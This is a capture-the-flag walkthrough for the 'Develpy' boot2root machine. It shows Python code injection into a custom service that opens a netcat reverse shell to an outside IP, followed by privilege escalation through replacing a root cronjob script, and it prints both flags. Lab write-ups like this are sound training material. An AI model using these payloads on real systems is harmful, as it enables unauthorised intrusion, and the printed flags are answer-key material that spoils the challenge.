# Develpy
### Prompt : boot2root machine for FIT and bsides Guatemala CTF
## IP : 10.10.142.114

we start with nmap scan to check which ports are open.
### Nmap Results:
![](https://i.imgur.com/aYegv60.png)

2 ports are open **22** with ssh service which requires login credentials and **10000**. Checking the port 10000 we get that there is a custom service running which is a python script.
### Getting the Shell
Using netcat, running the service. `$ nc 10.10.142.114 10000`

![](https://i.imgur.com/xs9dKUw.png)

It is taking input from the user which we can expolit to get a reverse shell using **os** module and **netcat** and setting a listener at our machine.
`input: __import__('os').system('nc -e /bin/sh 10.18.117.150 9000')`

![](https://i.imgur.com/FPLaml3.png)

![](https://i.imgur.com/KYdgVtE.png)

we don't have a stable shell, so we stabalize the shell using the command

`python -c 'import pty; pty.spawn("/bin/bash")'`

Listing the directory **king** we get a file **user.txt** which contains the user flag.

`user flag : cf85ff769cfaaa721758949bf870b019`

### Privilege Escalation
Now in the king directory we can see there are 2 bash scripts named **root.sh** and **run.sh**. 
After checking the crontab we get to know that root.sh is a cronjob executed every minute by the root. So we can exploit this and get a reverse shell using this cronjob.
As we can not edit the root.sh file but we can **remove and create** files in the king directory. 
After removing the previous root.sh script and adding the new script using echo (as text editors are not available). 

![](https://i.imgur.com/hyz0wNP.png)
##### Script to get the reverse shell:

![](https://i.imgur.com/81tuAh5.png)

After setting the listener on our machine we wait for cronjob to run for use to get the reverse shell.
`$ nc -lvnp 4440`

![](https://i.imgur.com/o3k0rkG.png)

now we have root privileges and can read the root flag from **/root/root.txt**

`root flag : 9c37646777a53910a347f387dce025ec`
